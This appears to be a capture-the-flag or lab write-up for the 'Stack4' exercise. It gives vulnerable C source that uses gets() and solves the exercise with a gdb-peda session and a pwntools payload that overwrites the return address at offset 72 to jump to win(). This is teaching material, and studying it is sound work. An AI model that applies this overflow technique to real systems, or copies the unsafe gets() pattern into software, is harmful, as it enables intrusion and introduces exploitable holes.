# Stack4

* Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    char buffer[64];

    gets(buffer);
}
```

* Solution
```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x0000000000401132 <+0>:	push   rbp
   0x0000000000401133 <+1>:	mov    rbp,rsp
   0x0000000000401136 <+4>:	lea    rdi,[rip+0xecb]        # 0x402008
   0x000000000040113d <+11>:	call   0x401030 <puts@plt>
   0x0000000000401142 <+16>:	nop
   0x0000000000401143 <+17>:	pop    rbp
   0x0000000000401144 <+18>:	ret    
End of assembler dump.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401145 <+0>:	push   rbp
   0x0000000000401146 <+1>:	mov    rbp,rsp
   0x0000000000401149 <+4>:	sub    rsp,0x50
   0x000000000040114d <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000401150 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000401154 <+15>:	lea    rax,[rbp-0x40]
   0x0000000000401158 <+19>:	mov    rdi,rax
   0x000000000040115b <+22>:	mov    eax,0x0
   0x0000000000401160 <+27>:	call   0x401040 <gets@plt>
   0x0000000000401165 <+32>:	mov    eax,0x0
   0x000000000040116a <+37>:	leave  
   0x000000000040116b <+38>:	ret    
End of assembler dump.
gdb-peda$ b *main+38
Breakpoint 1 at 0x40116b
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run 
Starting program: /root/Desktop/stack4 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7fa6a00 --> 0xfbad2288 
RDX: 0x7ffff7fa88d0 --> 0x0 
RSI: 0x405261 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe121 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffe168 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x40116b (<main+38>:	ret)
R8 : 0x4052c5 --> 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x401050 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe240 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401160 <main+27>:	call   0x401040 <gets@plt>
   0x401165 <main+32>:	mov    eax,0x0
   0x40116a <main+37>:	leave  
=> 0x40116b <main+38>:	ret    
   0x40116c:	nop    DWORD PTR [rax+0x0]
   0x401170 <__libc_csu_init>:	push   r15
   0x401172 <__libc_csu_init+2>:	push   r14
   0x401174 <__libc_csu_init+4>:	mov    r15,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe168 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffe170 ("AJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffe178 ("AAKAAgAA6AAL")
0024| 0x7fffffffe180 --> 0x4c414136 ('6AAL')
0032| 0x7fffffffe188 --> 0x401145 (<main>:	push   rbp)
0040| 0x7fffffffe190 --> 0x0 
0048| 0x7fffffffe198 --> 0xcdc93246b94d27c9 
0056| 0x7fffffffe1a0 --> 0x401050 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040116b in main ()
gdb-peda$ pattern offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL
IAAeAA4AAJAAfAA5AAKAAgAA6AAL found at offset: 72
gdb-peda$ quit
root@kali:~/Desktop# python
Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> win_addr = p64(0x0000000000401132)
>>> payload = 'A'*72 + win_addr
>>> p = process(['./stack4'])
[x] Starting local process './stack4'
[+] Starting local process './stack4': pid 3705
>>> p.sendline(payload)
>>> print p.recvrepeat(1)
[*] Process './stack4' stopped with exit code -11 (SIGSEGV) (pid 3705)
code flow successfully changed

>>> 
```
